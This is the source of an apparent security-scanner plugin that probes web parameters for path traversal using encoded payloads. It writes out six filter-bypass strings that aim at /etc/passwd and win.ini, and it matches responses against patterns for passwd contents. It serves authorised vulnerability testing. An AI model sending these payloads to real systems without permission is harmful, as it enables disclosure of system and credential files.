/* ---
id: path-traversal-encoding-bypass
name: Path Traversal Encoding Bypass (error-based)
description: Detects path traversal through encoded and normalized variants (single/double percent encoding, encoded backslashes, overlong-style sequences and filter-bypass dots) by comparing file-access error signatures against a neutral-value control.
author: GASH contributors
severity: high
tags: [path-traversal, lfi, injection, encoding]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 120
api_version: "1.0"
tests: tests/fixtures/path-traversal-encoding-bypass/
oracle_params:
  mode: path_traversal
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/path-traversal/path-traversal-encoding-bypass.js
// What: Tier 2 path-traversal plugin for encoded payload families.
// Why: Tier 1 sends one literal traversal payload per file. Naive filters strip
//   `../` only once, so single-encoded, double-encoded, backslash and
//   dot-collapsed forms reach the filesystem while the plain form does not.
//   The payloads are pre-encoded inside the raw URL/body so the engine's form
//   encoder cannot add or remove a layer. A body that merely echoes the
//   payload is reflection, not a file-access error, and is skipped.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const maxSends = 40;
  let sends = 0;
  const variants = [
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
  ];
  const neutral = "readme.txt";

  const severeSignal = (body) =>
    body.indexOf("no such file") !== -1 ||
    body.indexOf("failed to open") !== -1 ||
    body.indexOf("permission denied") !== -1 ||
    body.indexOf("etc/passwd") !== -1 ||
    body.indexOf("win.ini") !== -1 ||
    /root:[^:\r\n]*:0:0:/.test(body) ||
    /\[fonts\]/i.test(body);

  for (const point of points) {
    const loc = String(point.paramLocation || "query").toLowerCase();
    if (loc !== "query" && loc !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + variants.length * 2 > maxSends) {
      break;
    }
    const base = String(point.url || "").split("?")[0].split("#")[0];
    if (!base) {
      continue;
    }
    const method = point.method || "GET";
    const raw = (value) => {
      if (loc === "query") {
        return {
          url: base + "?" + encodeURIComponent(point.paramName) + "=" + value,
          method: method,
          paramName: "",
          paramLocation: "query",
          value: "",
        };
      }
      return {
        url: base,
        method: method,
        paramName: "",
        paramLocation: "body",
        value: encodeURIComponent(point.paramName) + "=" + value,
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
      };
    };

    let found = false;
    for (const variant of variants) {
      if (found) {
        break;
      }
      sends++;
      const resp = probe.send(raw(variant));
      sends++;
      const controlResp = probe.send(raw(neutral));
      const body = resp && resp.body ? String(resp.body) : "";
      // Reflected payload text is not file access. Keep the attempt only when
      // the response also carries an access error or file-content marker.
      if (body.indexOf(variant) !== -1 && !severeSignal(body)) {
        continue;
      }
      const ev = host.oracles.error(resp, controlResp, { mode: "path_traversal" });
      if (ev) {
        candidates.push(host.candidate(point, "error", ev));
        found = true;
      }
    }
  }
  return candidates;
}
